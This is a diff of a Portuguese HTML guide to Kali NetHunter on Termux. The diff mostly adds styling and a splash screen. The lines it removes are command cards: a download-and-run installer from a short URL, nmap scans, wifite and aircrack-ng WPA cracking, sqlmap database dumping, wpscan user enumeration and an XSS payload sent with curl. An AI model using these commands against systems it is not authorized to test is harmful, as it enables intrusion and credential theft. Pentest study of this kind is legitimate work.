@@ -1,297 +1,1079 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-<head><base href="https://d16ilfvy4mv02r.cloudfront.net/workspaces/18c94ed238da69889ce1ce410e3ee277/d92c25bb-de4b-46d0-85c0-a79e5450b290/files/">
+<head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
-<meta name="theme-color" content="#0d1117">
-<title>t-tools - Guia Kali/Termux</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<meta name="theme-color" content="#000000">
+<title>T-TOOL — Linux, Distros e Windows</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&display=swap" rel="stylesheet">
 <style>
-  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-  body { margin:0; font-family:'Segoe UI',Arial,sans-serif; background:#0d1117; color:#e6edf3; padding:20px 12px 60px; }
-  h1 { text-align:center; color:#58a6ff; margin:0 0 4px; font-size:21px; }
-  p.subtitle { text-align:center; color:#8b949e; margin:0 0 16px; font-size:14px; }
-  .search-box { max-width:700px; margin:0 auto 16px; display:flex; gap:8px; position:sticky; top:6px; z-index:10; }
-  input#q { flex:1; padding:14px 16px; border-radius:8px; border:1px solid #30363d; background:#161b22; color:#e6edf3; font-size:16px; min-width:0; }
-  button#searchBtn { padding:14px 18px; border-radius:8px; border:none; background:#238636; color:#fff; font-weight:bold; cursor:pointer; font-size:16px; white-space:nowrap; min-width:64px; }
-  button#searchBtn:active, button#searchBtn:hover { background:#2ea043; }
-  #results { max-width:900px; margin:0 auto; }
-  .card { background:#161b22; border:1px solid #30363d; border-radius:10px; padding:16px 18px; margin-bottom:14px; }
-  .card h3 { margin:0 0 6px; color:#79c0ff; font-size:15px; }
-  .card .tags { font-size:11px; color:#8b949e; margin-bottom:8px; }
-  .card .tags span { background:#21262d; padding:2px 8px; border-radius:12px; margin-right:5px; }
-  .cmd-wrap { display:flex; align-items:stretch; gap:6px; margin:6px 0; }
-  code.cmd { flex:1; display:block; background:#0d1117; border:1px solid #30363d; border-radius:6px; padding:10px 14px; color:#7ee787; font-family:'Consolas',monospace; font-size:13px; margin:0; white-space:pre-wrap; word-break:break-word; overflow-x:auto; }
-  .copy-btn { background:#21262d; border:1px solid #30363d; color:#c9d1d9; border-radius:6px; padding:0 12px; font-size:15px; cursor:pointer; min-width:40px; }
-  .copy-btn:active { background:#30363d; }
-  .copy-btn.done { background:#1f6f3d; color:#7ee787; }
-  mark { background:#f0a500; color:#0d1117; border-radius:3px; padding:0 1px; }
-  .steps { margin-top:10px; background:#0d1117; border:1px solid #1f6feb44; border-radius:8px; padding:10px 14px; }
-  .steps-title { color:#58a6ff; font-weight:bold; font-size:13px; margin-bottom:6px; }
-  .steps ol { margin:0; padding-left:18px; }
-  .steps li { font-size:13px; color:#c9d1d9; margin-bottom:6px; line-height:1.5; }
-  .uso { margin-top:8px; font-size:12.5px; color:#d29922; background:#3d2f00; border:1px solid #7d5a00; border-radius:6px; padding:7px 10px; }
-  .empty { text-align:center; color:#8b949e; margin-top:40px; }
-  .categories { max-width:900px; margin:0 auto 18px; display:flex; flex-wrap:wrap; gap:6px; justify-content:center; }
-  .categories button { background:#21262d; border:1px solid #30363d; color:#c9d1d9; padding:8px 14px; border-radius:16px; cursor:pointer; font-size:13px; min-height:36px; }
-  .categories button:active, .categories button:hover { background:#30363d; }
-  .categories button.active { background:#1f6feb; color:#fff; border-color:#388bfd; }
-  .count { text-align:center; color:#8b949e; font-size:12px; margin-bottom:12px; }
+  :root {
+    --bg: #000000;
+    --bg2: #060b12;
+    --card: #070d16;
+    --card2: #0c1725;
+    --border: #12374f;
+    --text: #d6ecff;
+    --text2: #7ba6c4;
+    --green: #00e5ff;      /* azul neon (acento principal) */
+    --green-d: #00b3e0;    /* azul neon escuro (botoes) */
+    --cyan: #6ec6ff;       /* azul fraco neon */
+    --blue: #2f7fff;
+    --purple: #a78bfa;
+    --amber: #f59e0b;
+    --red: #ef4444;
+    --radius: 14px;
+    --font-mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'SF Mono', 'Consolas', 'Courier New', 'Ubuntu Mono', monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  body { font-family: var(--font-mono); background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; letter-spacing: .01em; }
+  /* Fonte de terminal em TODOS os elementos */
+  button, input, select, textarea, .cmd-name, .cmd-desc, .card-title, .section-title,
+  .method-name, .method-sub, .distro-btn, .tab, .cat-chip, .splash-title, .tag,
+  h1, h2, h3, h4, p, span, li, td, th, div, a { font-family: var(--font-mono); }
+
+  /* TOPO */
+  header { background: linear-gradient(135deg, #000308, #06283d); padding: 20px 16px; position: sticky; top: 0; z-index: 100; border-bottom: 2px solid var(--border); }
+  .head-row { display: flex; align-items: center; gap: 10px; }
+  .logo { font-size: 1.3rem; font-weight: 900; display: flex; align-items: center; gap: 8px; }
+  .logo .ico { width: 34px; height: 34px; border-radius: 9px; background: linear-gradient(135deg, var(--green), var(--cyan)); display: flex; align-items: center; justify-content: center; font-size: 1.1rem; }
+  .logo small { display: block; font-size: .62rem; font-weight: 600; color: var(--text2); letter-spacing: .04em; }
+  .search-box { margin-top: 14px; display: flex; align-items: center; gap: 8px; background: var(--bg2); border: 2px solid var(--border); border-radius: 12px; padding: 0 12px; }
+  .search-box:focus-within { border-color: var(--green); }
+  .search-box input { flex: 1; background: none; border: none; outline: none; color: var(--text); font-size: 1rem; padding: 13px 0; font-family: inherit; }
+  .search-box .si { color: var(--text2); font-size: 1.1rem; }
+
+  /* TABS */
+  .tabs { display: flex; gap: 6px; margin-top: 14px; overflow-x: auto; padding-bottom: 2px; scrollbar-width: none; }
+  .tabs::-webkit-scrollbar { display: none; }
+  .tab { flex-shrink: 0; padding: 9px 16px; border-radius: 20px; background: var(--bg2); border: 1.5px solid var(--border); color: var(--text2); font-size: .85rem; font-weight: 700; cursor: pointer; white-space: nowrap; }
+  .tab.active { background: var(--green); border-color: var(--green); color: #001218; box-shadow: 0 0 16px rgba(0,229,255,.45); }
+
+  /* CONTAINER */
+  main { max-width: 760px; margin: 0 auto; padding: 16px 14px 60px; }
+
+  /* CHIPS CATEGORIA */
+  .cat-bar { display: flex; gap: 8px; overflow-x: auto; padding: 6px 0 14px; scrollbar-width: none; }
+  .cat-bar::-webkit-scrollbar { display: none; }
+  .cat-chip { flex-shrink: 0; padding: 8px 14px; border-radius: 18px; background: var(--card); border: 1.5px solid var(--border); color: var(--text2); font-size: .8rem; font-weight: 600; cursor: pointer; }
+  .cat-chip.active { background: var(--cyan); border-color: var(--cyan); color: #083344; }
+
+  .count-info { font-size: .8rem; color: var(--text2); margin-bottom: 10px; }
+  .count-info b { color: var(--green); }
+
+  /* CARD COMANDO */
+  .cmd-card { background: var(--card); border: 1.5px solid var(--border); border-radius: var(--radius); margin-bottom: 12px; overflow: hidden; }
+  .cmd-head { padding: 14px 16px; display: flex; align-items: flex-start; gap: 12px; cursor: pointer; }
+  .cmd-ico { width: 40px; height: 40px; border-radius: 10px; background: var(--bg2); display: flex; align-items: center; justify-content: center; font-size: 1.2rem; flex-shrink: 0; }
+  .cmd-meta { flex: 1; min-width: 0; }
+  .cmd-name { font-size: 1rem; font-weight: 800; color: #fff; }
+  .cmd-desc { font-size: .82rem; color: var(--text2); margin-top: 3px; line-height: 1.45; }
+  .cmd-tags { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 8px; }
+  .tag { font-size: .68rem; font-weight: 700; padding: 3px 8px; border-radius: 12px; background: var(--bg2); color: var(--cyan); border: 1px solid var(--border); }
+  .cmd-arrow { color: var(--text2); font-size: 1rem; transition: transform .2s; margin-top: 4px; }
+  .cmd-card.open .cmd-arrow { transform: rotate(180deg); }
+  .cmd-body { max-height: 0; overflow: hidden; transition: max-height .3s ease; padding: 0 16px; }
+  .cmd-card.open .cmd-body { max-height: 2200px; padding: 0 16px 16px; }
+  .cmd-block { font-size: .72rem; text-transform: uppercase; letter-spacing: .05em; color: var(--text2); font-weight: 800; margin: 14px 0 8px; }
+  pre { background: #020617; border: 1px solid var(--border); border-radius: 10px; padding: 12px; color: var(--cyan); font-family: 'SF Mono', 'Courier New', monospace; font-size: .8rem; line-height: 1.65; overflow-x: auto; white-space: pre-wrap; word-break: break-word; }
+  pre .c { color: #64748b; }
+  .step { display: flex; gap: 10px; margin-bottom: 9px; }
+  .step-n { width: 22px; height: 22px; border-radius: 50%; background: var(--green-d); color: #fff; font-size: .72rem; font-weight: 800; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 1px; }
+  .step-t { font-size: .85rem; color: var(--text); line-height: 1.5; }
+  .step-t code { background: var(--bg2); color: var(--cyan); padding: 2px 6px; border-radius: 5px; font-family: monospace; font-size: .8rem; }
+  .copy-row { display: flex; align-items: center; justify-content: space-between; gap: 8px; background: #020617; border: 1px solid var(--border); border-radius: 9px; padding: 10px 12px; margin: 6px 0; }
+  .copy-row code { color: var(--cyan); font-family: monospace; font-size: .78rem; word-break: break-all; }
+  .copy-btn { background: var(--green-d); border: none; color: #fff; padding: 8px 12px; border-radius: 8px; font-size: .75rem; font-weight: 700; cursor: pointer; flex-shrink: 0; min-width: 44px; }
+  .copy-btn:active { background: var(--green); }
+  mark { background: var(--amber); color: #000; border-radius: 3px; padding: 0 2px; }
+
+  .alert { border-radius: 10px; padding: 12px 14px; font-size: .82rem; line-height: 1.5; margin-top: 12px; }
+  .alert-warn { background: rgba(245,158,11,.12); border-left: 3px solid var(--amber); color: #fcd34d; }
+  .alert-info { background: rgba(59,130,246,.12); border-left: 3px solid var(--blue); color: #93c5fd; }
+  .alert-ok { background: rgba(0,229,255,.10); border-left: 3px solid var(--green); color: #8fe4ff; }
+
+  /* SEÇÃO EMULAÇÃO */
+  .hero { text-align: center; padding: 20px 0 10px; }
+  .hero h1 { font-size: 1.5rem; font-weight: 900; }
+  .hero p { color: var(--text2); font-size: .88rem; margin-top: 8px; line-height: 1.6; }
+  .method-card { background: var(--card); border: 2px solid var(--border); border-radius: var(--radius); margin-bottom: 14px; overflow: hidden; }
+  .method-head { padding: 16px; display: flex; align-items: center; gap: 12px; cursor: pointer; }
+  .method-ico { width: 46px; height: 46px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1.4rem; flex-shrink: 0; }
+  .mi-kali { background: rgba(59,130,246,.15); }
+  .mi-ubuntu { background: rgba(245,158,11,.15); }
+  .mi-debian { background: rgba(168,85,247,.15); }
+  .mi-xfce { background: rgba(34,211,238,.15); }
+  .mi-windows { background: rgba(59,130,246,.18); }
+  .mi-cloud { background: rgba(0,229,255,.15); }
+  .method-meta { flex: 1; }
+  .method-name { font-size: 1.02rem; font-weight: 800; color: #fff; }
+  .method-sub { font-size: .78rem; color: var(--text2); margin-top: 3px; }
+  .lvl { font-size: .66rem; font-weight: 800; padding: 3px 9px; border-radius: 10px; }
+  .lvl-easy { background: rgba(0,229,255,.2); color: #7ce9ff; }
+  .lvl-mid { background: rgba(245,158,11,.2); color: #fbbf24; }
+  .lvl-hard { background: rgba(239,68,68,.2); color: #f87171; }
+  .method-body { max-height: 0; overflow: hidden; transition: max-height .35s ease; padding: 0 16px; }
+  .method-card.open .method-body { max-height: 4000px; padding: 0 16px 16px; }
+
+  /* NAVEGAÇÃO ENTRE DISTROS */
+  .grid-distros { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; margin-bottom: 16px; }
+  .distro-btn { background: var(--card); border: 2px solid var(--border); border-radius: 12px; padding: 14px 10px; text-align: center; cursor: pointer; }
+  .distro-btn.active { border-color: var(--green); background: rgba(0,229,255,.10); box-shadow: 0 0 16px rgba(0,229,255,.25); }
+  .distro-btn .em { font-size: 1.5rem; }
+  .distro-btn .nm { font-size: .82rem; font-weight: 800; margin-top: 6px; color: #fff; }
+  .distro-btn .rl { font-size: .68rem; color: var(--text2); margin-top: 2px; }
+
+  footer { text-align: center; padding: 24px 16px; color: var(--text2); font-size: .78rem; border-top: 1px solid var(--border); margin-top: 30px; }
+  footer b { color: var(--green); }
+
+  /* TOAST */
+  #toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(80px); background: var(--green-d); color: #fff; padding: 12px 20px; border-radius: 12px; font-size: .85rem; font-weight: 700; z-index: 999; opacity: 0; transition: all .3s; max-width: 90%; text-align: center; }
+  #toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+
+  .hidden { display: none !important; }
+  .sec-title { font-size: 1.1rem; font-weight: 800; margin: 6px 0 12px; display: flex; align-items: center; gap: 8px; }
+  .sec-title .bar { width: 4px; height: 20px; background: var(--green); border-radius: 2px; }
+
+  /* ===== ABERTURA ANIMADA (SPLASH) ===== */
+  #splash { position: fixed; inset: 0; z-index: 99999; background: #000; display: flex; align-items: center; justify-content: center; flex-direction: column; overflow: hidden; transition: opacity .7s ease, visibility .7s; }
+  #splash.hide { opacity: 0; visibility: hidden; pointer-events: none; }
+  #matrix { position: absolute; inset: 0; width: 100%; height: 100%; opacity: .9; }
+  /* grade de fundo animada */
+  #splash::before { content: ''; position: absolute; inset: 0; pointer-events: none; z-index: 1;
+    background-image: linear-gradient(rgba(0,229,255,.07) 1px, transparent 1px), linear-gradient(90deg, rgba(0,229,255,.07) 1px, transparent 1px);
+    background-size: 42px 42px; animation: gridMove 5s linear infinite; }
+  @keyframes gridMove { from { background-position: 0 0; } to { background-position: 0 42px; } }
+  /* vinheta + brilho central */
+  #splash::after { content: ''; position: absolute; inset: 0; pointer-events: none; z-index: 1;
+    background: radial-gradient(circle at 50% 42%, rgba(0,229,255,.10) 0%, transparent 42%),
+                radial-gradient(circle at 50% 50%, transparent 40%, rgba(0,0,0,.55) 78%, rgba(0,0,0,.88) 100%); }
+  /* linha de varredura (scanline) */
+  .scanline { position: absolute; left: 0; right: 0; height: 120px; z-index: 1; pointer-events: none;
+    background: linear-gradient(to bottom, transparent, rgba(0,229,255,.10), transparent); animation: scan 4.5s linear infinite; }
+  @keyframes scan { from { top: -120px; } to { top: 100%; } }
+  .splash-inner { position: relative; z-index: 2; width: 100%; max-width: 560px; padding: 0 22px; text-align: center; }
+
+  /* Terminal */
+  .splash-term { background: rgba(2,8,16,.85); border: 1.5px solid var(--border); border-radius: 12px; padding: 14px 16px; text-align: left; font-family: 'SF Mono','Courier New',monospace; font-size: .8rem; line-height: 1.7; min-height: 118px; box-shadow: 0 0 30px rgba(0,229,255,.18), inset 0 0 30px rgba(0,229,255,.04); backdrop-filter: blur(2px); }
+  .splash-term .bar3 { display: flex; gap: 6px; margin-bottom: 10px; }
+  .splash-term .bar3 i { width: 11px; height: 11px; border-radius: 50%; display: block; }
+  .splash-term .bar3 i:nth-child(1){ background:#ff5f57; } .splash-term .bar3 i:nth-child(2){ background:#febc2e; } .splash-term .bar3 i:nth-child(3){ background:#28c840; }
+  #term-lines { color: var(--cyan); white-space: pre-wrap; word-break: break-word; }
+  #term-lines .p { color: var(--green); }
+  .caret { display: inline-block; width: 8px; height: 14px; background: var(--green); margin-left: 2px; animation: blink .9s step-end infinite; vertical-align: middle; box-shadow: 0 0 8px var(--green); }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  /* Título */
+  .splash-logo { margin-top: 26px; }
+  .splash-logo .mark { width: 74px; height: 74px; margin: 0 auto 16px; border-radius: 18px; background: linear-gradient(135deg, var(--green), var(--cyan)); display: flex; align-items: center; justify-content: center; font-size: 2.2rem; box-shadow: 0 0 30px rgba(0,229,255,.6), 0 0 70px rgba(0,229,255,.25); animation: pop .8s cubic-bezier(.2,1.4,.4,1) both; }
+  @keyframes pop { 0% { transform: scale(.3) rotate(-15deg); opacity: 0; } 100% { transform: scale(1) rotate(0); opacity: 1; } }
+  .splash-title { font-size: 2rem; font-weight: 900; letter-spacing: .02em; color: #fff; text-shadow: 0 0 18px rgba(0,229,255,.8), 0 0 40px rgba(0,229,255,.4); animation: fadeUp .9s .2s both; }
+  .splash-sub { margin-top: 8px; font-size: .82rem; color: var(--cyan); letter-spacing: .18em; text-transform: uppercase; animation: fadeUp .9s .45s both; }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(14px); } to { opacity: 1; transform: translateY(0); } }
+
+  /* Barra de progresso */
+  .splash-bar { margin-top: 26px; height: 4px; width: 100%; max-width: 320px; margin-left: auto; margin-right: auto; background: rgba(0,229,255,.12); border-radius: 99px; overflow: hidden; }
+  .splash-bar i { display: block; height: 100%; width: 0; background: linear-gradient(90deg, var(--green), var(--cyan)); box-shadow: 0 0 12px var(--green); animation: load 3.2s ease forwards; }
+  @keyframes load { to { width: 100%; } }
+  .splash-skip { margin-top: 16px; font-size: .72rem; color: var(--text2); letter-spacing: .08em; animation: fadeUp 1s 1.2s both; }
 </style>
 </head>
 <body>
 
-<h1>🐉 t-tools</h1>
-<p class="subtitle">Digite uma função ou clique numa categoria — cada comando vem com passo a passo</p>
-
-<div class="search">
-  <input type="text" id="q" placeholder="O que você quer fazer? Ex: sqlmap, wifi, quebrar senha...">
-  <button id="searchBtn">Buscar</button>
+<!-- ===== ABERTURA ANIMADA ===== -->
+<div id="splash">
+  <canvas id="matrix"></canvas>
+  <div class="scanline"></div>
+  <div class="splash-inner">
+    <div class="splash-term">
+      <div class="bar3"><i></i><i></i><i></i></div>
+      <div id="term-lines"></div>
+    </div>
+    <div class="splash-logo">
+      <div class="mark">💻</div>
+      <div class="splash-title">T-TOOL</div>
+      <div class="splash-sub">Linux · Distros · Windows · Códigos</div>
+    </div>
+    <div class="splash-bar"><i></i></div>
+    <div class="splash-skip">carregando ambiente... (toque para pular)</div>
+  </div>
 </div>
 
-<div class="categories" id="cats"></div>
-<div class="count" id="count"></div>
+<header>
+  <div class="head-row">
+    <div class="logo">
+      <div class="ico">💻</div>
+      <div>T-TOOL<small>Linux · Distros · Windows</small></div>
+    </div>
+  </div>
+  <div class="search-box">
+    <span class="si">🔍</span>
+    <input id="search" type="text" placeholder="Buscar comando, distro ou ferramenta..." autocomplete="off">
+  </div>
+  <div class="tabs">
+    <button class="tab active" onclick="switchTab('emular', this)">🖥️ Rodar T-TOOL</button>
+    <button class="tab" onclick="switchTab('comandos', this)">⌨️ Comandos</button>
+  </div>
+</header>
 
-<div id="results">
-<div class='card' data-cat='Termux Setup'><h3>Instalar e entrar no Kali dentro do Termux</h3><div class='tags'><span>instalar kali</span><span>nethunter</span><span>configurar termux</span><span>nh -r</span><span>kali</span></div><div class='cmd-wrap'><code class='cmd'>pkg update &amp;&amp; pkg upgrade -y
-pkg install wget -y
-wget -O install-nethunter-termux https://offs.ec/2MceZbN
-chmod +x install-nethunter-termux
-./install-nethunter-termux -l
-# depois de instalado, para entrar:
-nh -r   (ou: kali / nethunter)</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Abra o Termux e rode: pkg update &amp;&amp; pkg upgrade -y</li><li>Instale o wget: pkg install wget -y</li><li>Baixe o instalador: wget -O install-nethunter-termux https://offs.ec/2MceZbN</li><li>Dê permissão: chmod +x install-nethunter-termux</li><li>Execute: ./install-nethunter-termux -l</li><li>Para entrar no Kali depois: use nh -r (root) ou kali/nethunter.</li><li>Dentro do Kali use apt para instalar ferramentas.</li></ol></div><div class='uso'>💡 A forma de entrar varia: nh, nh -r, kali ou nethunter. Verifique a sua.</div></div>
-<div class='card' data-cat='Termux Setup'><h3>Entrar no Kali modo gráfico (KEX)</h3><div class='tags'><span>nethunter</span><span>kex</span><span>modo grafico</span><span>kali gui</span><span>vnc</span></div><div class='cmd-wrap'><code class='cmd'>nh -r
-nethunter kex start</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Entre no Kali: nh -r</li><li>Inicie o gráfico: nethunter kex start</li><li>Guarde a senha VNC que aparecer.</li><li>Para parar: nethunter kex stop.</li></ol></div></div>
-<div class='card' data-cat='Termux Setup'><h3>Atualizar o Kali (dentro do ambiente)</h3><div class='tags'><span>atualizar kali</span><span>upgrade</span><span>apt</span></div><div class='cmd-wrap'><code class='cmd'>sudo apt update &amp;&amp; sudo apt full-upgrade -y</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Entre no Kali com nh -r.</li><li>Rode: sudo apt update &amp;&amp; sudo apt full-upgrade -y</li><li>Confirme com &#x27;y&#x27; quando pedir.</li><li>Reinicie se o kernel mudar.</li></ol></div></div>
-<div class='card' data-cat='Rede'><h3>nmap - Descobrir hosts ativos na rede</h3><div class='tags'><span>nmap</span><span>escanear rede</span><span>hosts ativos</span><span>descobrir</span><span>varredura</span></div><div class='cmd-wrap'><code class='cmd'>nmap -sn 192.168.1.0/24</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Descubra seu IP: ip a</li><li>Use sua rede (ex: 192.168.1.0/24).</li><li>Rode: nmap -sn 192.168.1.0/24</li><li>Veja a lista de IPs ativos e MACs.</li></ol></div><div class='uso'>💡 Somente em redes próprias ou autorizadas.</div></div>
-<div class='card' data-cat='Rede'><h3>nmap - Scan de portas e versões</h3><div class='tags'><span>nmap</span><span>portas</span><span>servicos</span><span>scan de portas</span><span>versao</span></div><div class='cmd-wrap'><code class='cmd'>nmap -sV -p- 192.168.1.10</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Defina o alvo (IP).</li><li>Rode: nmap -sV -p- 192.168.1.10</li><li>-sV detecta versões; -p- todas as portas.</li><li>Analise: porta, serviço, versão.</li></ol></div></div>
-<div class='card' data-cat='Rede'><h3>nmap - Scan agressivo (SO + scripts)</h3><div class='tags'><span>nmap</span><span>agressivo</span><span>sistema operacional</span><span>os</span></div><div class='cmd-wrap'><code class='cmd'>nmap -A -T4 192.168.1.10</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: nmap -A -T4 192.168.1.10</li><li>-A: SO, versões, scripts, traceroute.</li><li>-T4: velocidade alta.</li><li>Veja a seção OS CPE.</li></ol></div></div>
-<div class='card' data-cat='Rede'><h3>tcpdump - Capturar pacotes</h3><div class='tags'><span>tcpdump</span><span>sniffar</span><span>capturar pacotes</span><span>pcap</span></div><div class='cmd-wrap'><code class='cmd'>tcpdump -i wlan0 -w captura.pcap</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Identifique a interface: ip addr</li><li>Rode: tcpdump -i wlan0 -w captura.pcap</li><li>Pare com Ctrl+C.</li><li>Analise com tshark/wireshark depois.</li></ol></div><div class='uso'>💡 Pode exigir root (nh -r).</div></div>
-<div class='card' data-cat='Rede'><h3>traceroute - Rota até um host</h3><div class='tags'><span>traceroute</span><span>rota</span><span>rastrear</span></div><div class='cmd-wrap'><code class='cmd'>traceroute -n alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: traceroute -n alvo.com</li><li>Mostra os saltos até o destino.</li><li>Use -n para não resolver DNS (mais rápido).</li></ol></div></div>
-<div class='card' data-cat='Rede'><h3>mtr - Diagnóstico de rede em tempo real</h3><div class='tags'><span>mtr</span><span>diagnostico</span><span>ping</span><span>traceroute</span></div><div class='cmd-wrap'><code class='cmd'>mtr alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: mtr alvo.com</li><li>Combina ping + traceroute.</li><li>Observe perda de pacotes e latência por salto.</li></ol></div></div>
-<div class='card' data-cat='Wifi'><h3>wifite - Ataque wifi automatizado</h3><div class='tags'><span>wifite</span><span>hackear wifi</span><span>wpa</span><span>wifi automatico</span><span>ataque wifi</span></div><div class='cmd-wrap'><code class='cmd'>sudo wifite</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Coloque a interface em modo monitor (se suportar).</li><li>Rode: sudo wifite</li><li>Ele lista as redes ao redor.</li><li>Selecione o alvo para capturar handshake.</li><li>Use uma wordlist quando pedir.</li><li>Somente em redes próprias/autoriadas.</li></ol></div><div class='uso'>💡 Requer modo monitor (root + chipset compatível).</div></div>
-<div class='card' data-cat='Wifi'><h3>aircrack-ng - Quebrar WPA/WPA2</h3><div class='tags'><span>aircrack-ng</span><span>quebrar senha</span><span>wpa2</span><span>handshake</span></div><div class='cmd-wrap'><code class='cmd'>aircrack-ng -w wordlist.txt -b &lt;BSSID&gt; captura.cap</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Capture o handshake (precisa modo monitor).</li><li>Use uma wordlist (ex: rockyou.txt).</li><li>Rode: aircrack-ng -w wordlist.txt -b &lt;BSSID&gt; captura.cap</li><li>Aguarde testar as senhas.</li></ol></div></div>
-<div class='card' data-cat='Wifi'><h3>airmon-ng - Ativar modo monitor</h3><div class='tags'><span>airmon-ng</span><span>modo monitor</span><span>interface</span></div><div class='cmd-wrap'><code class='cmd'>sudo airmon-ng start wlan0</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: sudo airmon-ng start wlan0</li><li>A interface vira wlan0mon.</li><li>Use airodump-ng para capturar.</li><li>Volte ao normal: sudo airmon-ng stop wlan0mon.</li></ol></div><div class='uso'>💡 Exige root + chipset que suporte modo monitor.</div></div>
-<div class='card' data-cat='Ataques Web'><h3>gobuster - Descobrir diretórios</h3><div class='tags'><span>gobuster</span><span>diretorios</span><span>fuzzing</span><span>pastas</span><span>site</span></div><div class='cmd-wrap'><code class='cmd'>gobuster dir -u http://alvo.com -w wordlist.txt</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Tenha uma wordlist (ex: /usr/share/wordlists/dirb/common.txt).</li><li>Rode: gobuster dir -u http://alvo.com -w wordlist.txt</li><li>Código 200 = diretório existe.</li><li>Use -x php,html para filtrar extensões.</li></ol></div></div>
-<div class='card' data-cat='Ataques Web'><h3>sqlmap - Testar SQL Injection</h3><div class='tags'><span>sqlmap</span><span>sql injection</span><span>banco</span><span>injeção</span></div><div class='cmd-wrap'><code class='cmd'>sqlmap -u &quot;http://alvo.com/page?id=1&quot; --dbs</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Encontre um parâmetro na URL (ex: id=1).</li><li>Rode: sqlmap -u &quot;http://alvo.com/page?id=1&quot; --dbs</li><li>Confirme com &#x27;y&#x27; quando perguntar.</li><li>--dbs lista bancos de dados.</li><li>Depois use --tables e --dump.</li></ol></div><div class='uso'>💡 Só em sites que você controla ou autorizou.</div></div>
-<div class='card' data-cat='Ataques Web'><h3>wpscan - Escanear WordPress</h3><div class='tags'><span>wpscan</span><span>wordpress</span><span>plugin</span><span>usuario</span></div><div class='cmd-wrap'><code class='cmd'>wpscan --url http://alvo.com --enumerate</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: wpscan --url http://alvo.com --enumerate</li><li>Lista plugins, temas e usuários.</li><li>Use --api-token &lt;chave&gt; para vulnerabilidades.</li><li>Anote plugins desatualizados.</li></ol></div></div>
-<div class='card' data-cat='Ataques Web'><h3>nikto - Scanner de vulnerabilidades web</h3><div class='tags'><span>nikto</span><span>scanner web</span><span>vulnerabilidades</span></div><div class='cmd-wrap'><code class='cmd'>nikto -h http://alvo.com</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Rode: nikto -h http://alvo.com</li><li>Ele verifica falhas comuns do servidor web.</li><li>Analise o relatório gerado.</li></ol></div></div>
-<div class='card' data-cat='Ataques Web'><h3>XSS - Testar injeção de script</h3><div class='tags'><span>xss</span><span>cross site</span><span>script</span><span>injetar</span></div><div class='cmd-wrap'><code class='cmd'>curl -X POST &#x27;http://alvo.com/form&#x27; -d &#x27;nome=&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</code><button class='copy-btn' onclick='copyCmd(this)' title='Copiar comando'>📋</button></div><div class='steps'><div class='steps-title'>📋 Passo a passo</div><ol><li>Ache um campo de formulário.</li><li>Envie o payload: &lt;script&gt;alert(1)&lt;/script&gt;</li><li>Se abrir a janela, há XSS.</li><li>Somente em sites próprios.</li></ol></div></div>
